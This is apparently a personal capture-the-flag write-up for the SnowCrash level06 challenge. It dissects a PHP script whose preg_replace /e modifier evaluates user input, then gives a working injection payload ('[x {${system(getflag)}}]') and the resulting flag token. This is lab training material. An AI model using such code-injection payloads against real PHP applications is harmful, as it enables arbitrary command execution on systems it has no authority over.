level06@SnowCrash:~$ strings level06
[...]
execve
[...]
free
[...]
/usr/bin/php
/home/user/level06/level06.php
;*2$"$
[...]


level06@SnowCrash:~$ strings level06.php 
#!/usr/bin/php
<?php
function y($m) { $m = preg_replace("/\./", " x ", $m); $m = preg_replace("/@/", " y", $m); return $m; }
function x($y, $z) { $a = file_get_contents($y); $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a); $a = preg_replace("/\[/", "(", $a); $a = preg_replace("/\]/", ")", $a); return $a; }
$r = x($argv[1], $argv[2]); print $r;

FOR LATER : echo > /tmp/test.txt "Hello :D"
./level06 "/tmp/test.txt"
	Hello :D


first function captures everything after x in [x {...}] and executes whatever is in {...} as php code
using the second function that replaces '.' by ' x ' and '@' by 'y ' (unused in our case)

if we give : "[x {${system(getflag)}}]" as input from /tmp/test.txt file 
first function will isolate "{${system(getflag)}}", secon won't replace anything
and "system" executes a  command ("getflag") and returns the result which is interpretad as 
a variable because of the '$'

return :
level06@SnowCrash:~$ ./level06 /tmp/test.txt "useless ?"
PHP Notice:  Use of undefined constant getflag - assumed 'getflag' in /home/user/level06/level06.php(4) : regexp code on line 1
Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub in /home/user

getflag is given without any quote which makes php thinks it's a constant variable (notice message)
but still continues with the system(getflag) call even with this notice
